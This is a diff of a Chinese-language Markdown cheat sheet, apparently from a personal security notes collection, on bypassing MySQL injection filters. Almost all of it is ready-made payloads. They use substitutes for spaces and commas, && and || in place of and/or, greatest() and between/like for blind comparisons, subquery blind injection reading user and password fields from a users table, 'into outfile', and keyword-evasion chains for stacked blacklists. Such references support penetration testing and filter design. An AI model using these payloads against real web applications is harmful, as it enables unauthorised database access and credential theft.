@@ -1,5 +1,5 @@
 ---
-title: "Mysql注入过滤"
+title: "005_Mysql注入过滤绕过"
 date: 2016-04-25 21:09
 ---
 
@@ -39,11 +39,11 @@ where id=.1union/*.1*/select"1"
 where id=.1union/*.1*/select@1
 ```
 
-## 特殊符号绕过
+## 黑名单过滤绕过
 
 ### 过滤空格
 
-在MySQL中可替换为：
+反引号, 括号, 注释(/**/) 绕过
 
 ```
 # 反引号
@@ -52,12 +52,10 @@ SQL> select * from`user`;
 # 括号
 SQL> 'and(true)like(false)union(select(pass)from(users))#
 
-# +
-
 # /**/
 ```
 
-空格可以使用如下替代：
+空格还可以使用如下替代：
 
 > 在php中 \s 会匹配0x09,0x0a,0x0b,0x0c,0x0d,0x20
 
@@ -76,8 +74,6 @@ a0：空格
 21：!
 40：@
 ```
-
-空格替换为：#Xburne%0a
 
 在特定数据库中可以使用以下替代：
 
@@ -98,6 +94,8 @@ SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))
 
 ### 过滤逗号
 
+* select 1,2,3
+
 使用语法绕过：
 
 ```
@@ -106,7 +104,155 @@ SQL> UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c);
 SQL> UNION SELECT 1,2,3;
 ```
 
-### 过滤 = ( '
+* substr/mid
+
+绕过方法: `from x for y`
+
+```
+substr('password', 5, 1)
+=substr('password' from 5 for 1)
+
+mid('password', 5, 1)
+=mid('password' from 5 for 1)
+```
+
+### 过滤 `>`, `<`
+
+* greatest函数绕过
+
+> greatest(a,b)，返回a和b中较大的那个数
+
+```
+# 猜解user()第一个字符的ascii码是否小于等于150时
+ascii(mid(user(),1,1)) <= 150
+=greatest(ascii(mid(user(),1,1)), 150)=150;
+```
+
+* =, !=
+
+枚举爆破绕过
+
+### 过滤select
+
+利用数值计算盲注或时间盲注
+
+```
+|| ascii(mid(user(),1,1) ) = 97 %23
+```
+
+### 过滤and，or可以使用&&和||
+
+```
+过滤：1 or 1 = 1 1 and 1 = 1
+绕过：1 || 1 = 1 1 && a = 1
+
+绕过：^, =, !=, %, /, *, &, &&, |, ||, <, >, >>, <<, >=, <=, <>, <=>, XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN, ...
+```
+
+### 过滤union
+
+* 子查询盲注
+
+```
+过滤：union select user, passwd from users
+绕过：1 || (select user from users where user_id = 1) = 'admin'
+```
+
+## 过滤单引号
+
+* 字符串转换函数绕过
+
+```
+char()
+```
+
+* 十六进制数绕过
+
+## 过滤 `=`
+
+* between, like, <, > 绕过
+
+```
+1 union select 1, table_name from information_schema.tables where table_name = 'users'
+
+>select 1, table_name from information_schema.tables where table_name between 'u' and 'v';
++---+-----------------+
+| 1 | table_name      |
++---+-----------------+
+| 1 | USER_PRIVILEGES |
+| 1 | USER_STATISTICS |
+| 1 | user            |
+| 1 | users           |
++---+-----------------+
+
+>select 1, table_name from information_schema.tables where table_name like 'u%';
++---+-----------------+
+| 1 | table_name      |
++---+-----------------+
+| 1 | USER_PRIVILEGES |
+| 1 | USER_STATISTICS |
+| 1 | user            |
+| 1 | users           |
++---+-----------------+
+```
+
+* >, < 绕过
+
+```
+>select 1, table_name from information_schema.tables where table_name > 'u' and table_name < 'v';
++---+-----------------+
+| 1 | table_name      |
++---+-----------------+
+| 1 | USER_PRIVILEGES |
+| 1 | USER_STATISTICS |
+| 1 | user            |
+| 1 | users           |
++---+-----------------+
+```
+
+### 组合过滤
+
+* 同时过滤and，or，union，where
+
+```
+过滤：1 || (select user from users where user_id = 1) = 'admin'
+绕过：1 || (select user from users limit 1) = 'admin'
+```
+
+* 同时过滤and，or，union，where，limit
+
+```
+过滤：1 || (select user from users limit 1) = 'admin'
+绕过：1 || (select user from users group by user_id having user_id = 1) = 'admin'
+```
+
+* 同时过滤and，or，union，where，limit，group by
+
+```
+过滤：1 || (select user from users group by user_id having user_id = 1) = 'admin'
+绕过：1 || (select substr(group_concat(user),1,5) from users) = 'admin'
+```
+
+* 同时过滤and，or，union，where，limit，group by，select
+
+```
+过滤：1 || (select substr(group_concat(user),1,5) from users) = 'admin'
+绕过：1 || 1 = 1 into outfile 'result.txt'
+绕过：1 || substr(user,1,5) = 'admin'
+绕过：1 || user_id is not null
+绕过：1 || substr(user,1,1) = 0x61
+绕过：1 || substr(user,1,1) = unhex(61)
+绕过：1 || substr(user,1,1) = lower(conv(11,10,36))
+```
+
+* 同时绕过and，or，union，where，limit，group by，select，hex，substr
+
+```
+过滤：1 || substr(user,1,1) = lower(conv(11,10,36))
+绕过：1 || lpad(user,7,1)
+```
+
+* 过滤 = ( '
 
 ```
 过滤：1 union select 1, table_name from information_schema.tables where table_name = 'users'
@@ -213,64 +359,8 @@ SQL> union/*%aa*/select
 ' and substr(data,1,1) = lower(conv(36,10,36))# 'z'
 ```
 
-## 语法绕过
 
-### 关键词绕过
 
-* 过滤and，or可以使用&&和||
-
-```
-过滤：1 or 1 = 1 1 and 1 = 1
-绕过：1 || 1 = 1 1 && a = 1
-绕过：^, =, !=, %, /, *, &, &&, |, ||, <, >, >>, <<, >=, <=, <>, <=>, XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN, ...
-```
-
-* 同时过滤and，or，union
-
-```
-过滤：union select user, passwd from users
-绕过：1 || (select user from users where user_id = 1) = 'admin'
-```
-
-* 同时过滤and，or，union，where
-
-```
-过滤：1 || (select user from users where user_id = 1) = 'admin'
-绕过：1 || (select user from users limit 1) = 'admin'
-```
-
-* 同时过滤and，or，union，where，limit
-
-```
-过滤：1 || (select user from users limit 1) = 'admin'
-绕过：1 || (select user from users group by user_id having user_id = 1) = 'admin'
-```
-
-* 同时过滤and，or，union，where，limit，group by
-
-```
-过滤：1 || (select user from users group by user_id having user_id = 1) = 'admin'
-绕过：1 || (select substr(group_concat(user),1,5) from users) = 'admin'
-```
-
-* 同时过滤and，or，union，where，limit，group by，select
-
-```
-过滤：1 || (select substr(group_concat(user),1,5) from users) = 'admin'
-绕过：1 || 1 = 1 into outfile 'result.txt'
-绕过：1 || substr(user,1,5) = 'admin'
-绕过：1 || user_id is not null
-绕过：1 || substr(user,1,1) = 0x61
-绕过：1 || substr(user,1,1) = unhex(61)
-绕过：1 || substr(user,1,1) = lower(conv(11,10,36))
-```
-
-* 同时绕过and，or，union，where，limit，group by，select，hex，substr
-
-```
-过滤：1 || substr(user,1,1) = lower(conv(11,10,36))
-绕过：1 || lpad(user,7,1)
-```
 
 ### 移除关键词
 
